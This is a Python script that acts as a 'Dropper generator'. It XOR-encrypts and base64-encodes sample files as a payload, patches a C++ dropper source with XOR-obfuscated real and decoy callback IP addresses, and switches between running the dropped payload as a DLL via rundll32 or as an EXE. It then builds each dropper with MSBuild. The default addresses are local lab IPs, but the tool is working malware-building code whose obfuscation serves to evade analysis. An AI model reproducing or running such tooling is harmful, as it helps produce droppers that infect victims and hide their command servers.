import os
import base64
import subprocess
import shutil
import random
import re
import argparse

SAMPLES_DIR = r"C:\Users\krv\samples"
RESOURCE_FILE = r"C:\Users\krv\payload.bin"
OUTPUT_DIR = r"C:\Users\krv\output"
MSBUILD = r"C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe"
PROJECT = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\droppertest\droppertest\droppertest.vcxproj"
BUILT = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\droppertest\droppertest\x64\Release\droppertest.exe"
SOURCE = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\Dropper\Dropper\Source.cpp"

DEFAULT_IP_XOR_KEY = 0x41
DEFAULT_IP2_XOR_KEY = 0x41
DEFAULT_PRIMARY_IP = "192.168.56.1"
DEFAULT_REAL_IP = "192.168.56.1"
DEFAULT_DECOY_IP = "192.168.56.1"


def xor_encode_ip(ip_str, key):
    encoded = [b ^ key for b in ip_str.encode()]
    return "{" + ", ".join(hex(b) for b in encoded) + "}"


def patch_source(source, xor_key, primary_ip, real_ip, real_ip_key, decoy_ip, decoy_ip_key, inject=True):
    source = re.sub(r"#define XOR_KEY 0x[0-9a-fA-F]+",
                    f"#define XOR_KEY {hex(xor_key)}", source)
    source = re.sub(r'#define PRIMARY_IP "[^"]*"',
                    f'#define PRIMARY_IP "{primary_ip}"', source)
    encoded_real = xor_encode_ip(real_ip, real_ip_key)
    source = re.sub(r"#define IP_XOR_KEY 0x[0-9a-fA-F]+",
                    f"#define IP_XOR_KEY {hex(real_ip_key)}", source)
    source = re.sub(r"#define ENCODED_IP \{[^}]+\}",
                    f"#define ENCODED_IP {encoded_real}", source)
    source = re.sub(r"#define ENCODED_IP_LEN \d+",
                    f"#define ENCODED_IP_LEN {len(real_ip)}", source)
    encoded_decoy = xor_encode_ip(decoy_ip, decoy_ip_key)
    source = re.sub(r"#define IP2_XOR_KEY 0x[0-9a-fA-F]+",
                    f"#define IP2_XOR_KEY {hex(decoy_ip_key)}", source)
    source = re.sub(r"#define ENCODED_IP2 \{[^}]+\}",
                    f"#define ENCODED_IP2 {encoded_decoy}", source)
    source = re.sub(r"#define ENCODED_IP2_LEN \d+",
                    f"#define ENCODED_IP2_LEN {len(decoy_ip)}", source)
    if inject:
        source = re.sub(r'^//#define INJECT', '#define INJECT', source, flags=re.MULTILINE)
    else:
        source = re.sub(r'^#define INJECT$', '//#define INJECT', source, flags=re.MULTILINE)
    return source


def main():
    parser = argparse.ArgumentParser(description="Dropper generator")
    parser.add_argument("--ip1", required=True,
                        help="Plain string IP embedded in binary")
    parser.add_argument("--ip2", required=True,
                        help="Real connection IP, obfuscated")
    parser.add_argument("--ip3", required=True,
                        help="Secondary obfuscated IP, no connection")
    parser.add_argument("--inject", action="store_true", default=True,
                        help="Drop and run as DLL via rundll32 (default)")
    parser.add_argument("--no-inject", dest="inject", action="store_false",
                        help="Drop and run as EXE directly")
    args = parser.parse_args()

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    for filename in os.listdir(SAMPLES_DIR):
        filepath = os.path.join(SAMPLES_DIR, filename)
        if not os.path.isfile(filepath):
            continue

        print(f"[*] Processing {filename}")

        xor_key = random.randint(1, 255)
        ip_xor_key = random.randint(1, 255)
        ip2_xor_key = random.randint(1, 255)
        print(f"[*] XOR key: {hex(xor_key)}")
        print(f"[*] IP XOR key (real): {hex(ip_xor_key)}")
        print(f"[*] IP2 XOR key (decoy): {hex(ip2_xor_key)}")

        with open(SOURCE, "r") as f:
            source = f.read()
        source = patch_source(
            source,
            xor_key=xor_key,
            primary_ip=args.ip1,
            real_ip=args.ip2,
            real_ip_key=ip_xor_key,
            decoy_ip=args.ip3,
            decoy_ip_key=ip2_xor_key,
            inject=args.inject,
        )
        with open(SOURCE, "w") as f:
            f.write(source)

        with open(filepath, "rb") as f:
            raw = f.read()
        encoded = base64.b64encode(bytes([b ^ xor_key for b in raw]))
        with open(RESOURCE_FILE, "wb") as f:
            f.write(encoded)

        result = subprocess.run([
            MSBUILD, PROJECT,
            "/p:Configuration=Release",
            "/p:Platform=x64",
            "/t:Rebuild",
            "/verbosity:minimal"
        ], capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[!] Build failed for {filename}")
            print(result.stdout)
            continue

        out_path = os.path.join(OUTPUT_DIR, f"{filename}_dropper.exe")
        shutil.copy(BUILT, out_path)
        print(f"[+] Done: {out_path}")

    with open(SOURCE, "r") as f:
        source = f.read()
        source = patch_source(
        source,
        xor_key=0x73,
        primary_ip=DEFAULT_PRIMARY_IP,
        real_ip=DEFAULT_REAL_IP,
        real_ip_key=DEFAULT_IP_XOR_KEY,
        decoy_ip=DEFAULT_DECOY_IP,
        decoy_ip_key=DEFAULT_IP2_XOR_KEY,
        inject=True,
    )
    with open(SOURCE, "w") as f:
        f.write(source)

    print("[*] Source.cpp reset to defaults")
    os.remove(RESOURCE_FILE)
    print("[*] Cleaned up payload.bin")
    print("[*] All samples processed.")


if __name__ == "__main__":
    main()